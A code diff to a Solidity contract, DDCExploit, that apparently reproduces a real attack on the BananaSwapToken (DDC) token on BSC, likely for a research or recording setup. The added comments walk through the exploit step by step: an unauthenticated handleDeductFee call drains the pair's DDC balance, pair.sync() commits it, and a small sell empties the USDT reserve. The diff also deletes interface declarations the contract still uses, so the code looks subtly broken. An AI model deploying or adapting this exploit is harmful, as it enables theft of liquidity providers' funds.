@@ -6,36 +6,50 @@ pragma solidity ^0.8.10;
 // Foundry `ContractTest` (no standalone exploit contract); this file faithfully
 // copies that inline logic into a self-contained contract so the recorder can
 // deploy + record a single `attack()` call.
-//
-// Root cause: BananaSwapToken.handleDeductFee() is `external` with NO access
-// control and debits a CALLER-SUPPLIED `from`. Pointing `from` at the DDC/USDT
-// pair lets an attacker erase the pair's DDC balance, then pair.sync() adopts
-// the depleted balance as the reserve (breaking x*y=k), and a tiny DDC sell
-// drains the entire USDT side.
 
-interface IERC20 {
-    function balanceOf(address owner) external view returns (uint256);
-    function approve(address spender, uint256 value) external returns (bool);
-}
+// VULNERABILITY: Unauthenticated arbitrary-from fee deduction in BananaSwapToken (DDC)
+// Root cause (in vulnerable token, read-only here):
+//   BananaSwapToken (0x443195...) implements ITokenAFeeHandler.
+//   handleDeductFee is EXTERNAL and completely unauthenticated:
+//     (from sources/.../contracts_banana_BananaSwapToken.sol:228)
+//     function handleDeductFee(ActionType actionType, uint256 feeAmount, address from, address user) external override {
+//         distributeFee(actionType, feeAmount, from, user);
+//     }
+//   distributeFee (line 159):
+//     _balances[from] = _balances[from].sub(feeAmount);   // direct arbitrary debit
+//     for each rewardType in configMaps[actionType]:
+//         portion = (feeRatio * feeAmount) / totalFeeRatio
+//         _balances[feeHandler] += portion;
+//         emit Transfer(from, feeHandler, portion);
+//   - No onlyOwner / onlyManager / msg.sender == from check.
+//   - 'from' and 'user' are fully attacker-controlled parameters.
+//   - Intended ONLY for internal self-calls (`this.handleDeductFee`) during fee-bearing transfers:
+//       * normal user transfers (ActionType.Transfer)
+//       * router-mediated buys/sells via transferFee/transferFromFee (ActionType.Buy/Sell etc.)
+//   Because DDC is a fee token, the pair contract's DDC.balanceOf(pair) is treated as the reserve.
+//   Calling handleDeductFee drains that balance (to configured handlers or lost) without any pair involvement or approval.
+//   pair.sync() then commits the lie: reserves become (near-zero DDC, original USDT).
+//   A subsequent sell of a small DDC amount (bought with 0.1 BNB) against the inflated price drains the USDT side completely.
+//   Why no revert: sub() succeeds as long as amount <= balance (we leave 1 wei); no other guards in the fee path for contract 'from'.
+//   Cross-reference to interfaces: handleDeductFee(uint8, uint256, address, address) -- note uint8 cast of ActionType.
 
-interface ITokenAFeeHandler is IERC20 {
-    // ActionType.Buy = 0; ActionType.Sell = 1
-    function handleDeductFee(uint8 actionType, uint256 feeAmount, address from, address user) external;
-}
-
-interface IRouter {
-    function swapExactTokensForTokens(
-        uint256 amountIn,
-        uint256 amountOutMin,
-        address[] calldata path,
-        address to,
-        uint256 deadline
-    ) external;
-}
-
-interface IPair {
-    function sync() external;
-}
+// EXPLOIT STEPS:
+// 1. Receive 0.1 ether (WBNB seed): address(WBNB).call{value: 0.1 ether}("") in attack() payable.
+// 2. Acquire starter DDC position for the sell leg: _buyDDC() does WBNB.approve(router), 3-hop swap WBNB->USDT->DDC, then DDC.approve(router).
+// 3. Compute drain amount against CURRENT on-chain pair balance (not cached reserve):
+//      uint256 pairReserve = DDC.balanceOf(address(TargetPair));
+//      uint256 amount = pairReserve - 1;
+// 4. Trigger the vuln:
+//      DDC.handleDeductFee(0 /*Buy*/, amount, address(TargetPair), address(this));
+//    Inside token: _balances[TargetPair] -= amount; distribute per Buy config (may burn or route to handlers).
+//    Attacker's DDC balance unchanged; pair's token balance is now ~0.
+// 5. Reconcile reserves to the manipulated state:
+//      TargetPair.sync();
+//    (UniswapV2 Pair impl): updates reserve0/reserve1 = current balances. Invariant violated.
+// 6. Dump the starter DDC into the poisoned pool:
+//      _sellDDC() -> router.swapExactTokensForTokens(DDC.balanceOf(this), 0, [DDC, USDT], this, ...);
+//    The getAmountOut math (reserveIn * amountOut / (reserveOut + ...)) now returns almost the entire USDT reserve.
+// 7. Result: attacker holds drained USDT; original LPs' liquidity is extracted. No other preconditions (no admin role, no flash loan, no prior LP tokens).
 
 contract DDCExploit {
     IERC20 internal constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
@@ -52,6 +66,9 @@ contract DDCExploit {
         // Step 2 — the exploit: drain the pair's DDC balance to 1 wei via the
         // unauthenticated fee handler. `from` = the AMM pair, so distributeFee
         // debits the pair's reserve.
+        // VULN TRIGGER (see VULNERABILITY header): handleDeductFee(0, amount, pair, this)
+        // executes _balances[pair] = _balances[pair].sub(amount) + fee redistribution
+        // with zero authorization. (BananaSwapToken:159 and :228)
         uint256 pairReserve = DDC.balanceOf(address(TargetPair));
         uint256 amount = pairReserve - 1;
         DDC.handleDeductFee(0, amount, address(TargetPair), address(this));
